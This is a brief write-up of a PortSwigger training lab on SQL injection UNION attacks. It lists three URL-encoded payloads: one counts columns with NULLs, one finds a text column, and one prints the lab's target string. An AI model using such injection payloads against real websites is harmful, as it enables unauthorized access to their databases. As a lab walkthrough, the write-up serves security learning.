# SQL Injection Part 2

## Portswigger Labs
### [Lab 3: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

**To solve: find column containing text and print gDi73c**

**STEP 1:**
Find number of colums
```html
'+UNION+SELECT+NULL,NULL,NULL--
```

**STEP 2:**
Find columns that contains text
```html
'+UNION+SELECT+NULL,'abcd',NULL--
```

**STEP 3:**
Print the text 'gDi73c'
```html
'+UNION+SELECT+null,+'gDi73c',+null--
```


